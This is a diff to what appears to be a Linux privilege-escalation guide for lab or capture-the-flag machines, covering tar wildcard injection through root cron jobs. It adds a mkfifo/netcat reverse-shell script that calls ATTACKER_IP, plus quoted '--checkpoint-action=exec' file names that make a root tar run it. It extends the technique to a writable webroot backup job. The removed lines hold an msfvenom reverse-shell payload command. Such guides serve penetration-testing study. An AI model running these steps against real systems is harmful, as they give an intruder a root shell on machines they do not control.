@@ -1753,33 +1753,70 @@ cat /usr/local/bin/compress.sh
 
 * Note that the tar command is being run with a wildcard (\*) in your home directory.
 * Take a look at the GTFOBins page for tar. Note that tar has command line options that let you run other commands as part of a checkpoint feature.
-* Use msfvenom on your Kali box to generate a reverse shell ELF binary. Update the LHOST IP address accordingly:
-
-```
-msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f elf -o shell.elf
-```
-
-* Transfer the shell.elf file to /home/user/ on the Debian VM.
-
-```
-chmod +x /home/user/shell.elf
-```
-
-* Create these two files in /home/user:
+* Prefer a small shell script payload and execute it with `sh` from tar's checkpoint action:
 
 ```bash
-echo "" > "/home/user/--checkpoint=1"
-echo "" > "/home/user/--checkpoint-action=exec=shell.elf"
+cat > shell.sh << 'EOF'
+#!/bin/bash
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc ATTACKER_IP 80 >/tmp/f
+EOF
+chmod +x shell.sh
 ```
 
-`touch` will not work here — it treats `--checkpoint` as its own flag. Use `echo "" >` with the filename quoted instead.
+* Create these two files in the directory where the wildcard expands:
 
-* When the tar command in the cron job runs, the wildcard (\*) will expand to include these files.
-* Since their filenames are valid tar command line options, tar will recognize them as such and treat them as command line options rather than filenames.
-* Set up a netcat listener on your Kali box on port 4444 and wait for the cron job to run. A root shell should connect back to your netcat listener.
-
+```bash
+echo "" > "--checkpoint=1"
+echo "" > "--checkpoint-action=exec=sh shell.sh"
 ```
-nc -nvlp 4444
+
+`touch` may treat `--checkpoint` as its own flag. Use `echo "" >` with the filename quoted instead.
+
+* Start a listener and wait for the cron job:
+
+```bash
+nc -nlvp 80
+```
+
+#### Webroot backup tar wildcard
+
+A common successful pattern is a root cron job that backs up a webroot when recently modified files exist:
+
+```bash
+cat /etc/crontab
+# */3 * * * * root /usr/local/bin/backup.sh
+
+cat /usr/local/bin/backup.sh
+# cd /var/www/html
+# if [ $(find . -type f -mmin -3 | wc -l) -gt 0 ]; then
+# tar -cf /opt/backups/website.tar *
+# fi
+```
+
+If the webroot is writable by your current user, drop the payload and checkpoint option files there:
+
+```bash
+cd /var/www/html
+cat > shell.sh << 'EOF'
+#!/bin/bash
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc ATTACKER_IP 80 >/tmp/f
+EOF
+chmod +x shell.sh
+
+echo "" > "--checkpoint=1"
+echo "" > "--checkpoint-action=exec=sh shell.sh"
+```
+
+Confirm the cron condition will be true:
+
+```bash
+find . -type f -mmin -3 | wc -l
+```
+
+When the tar command runs, the wildcard (`*`) expands to include the checkpoint files, and tar executes `sh shell.sh` as root.
+
+```bash
+nc -nlvp 80
 ```
 
 #### CronJobs - Wildcards No msfvenom
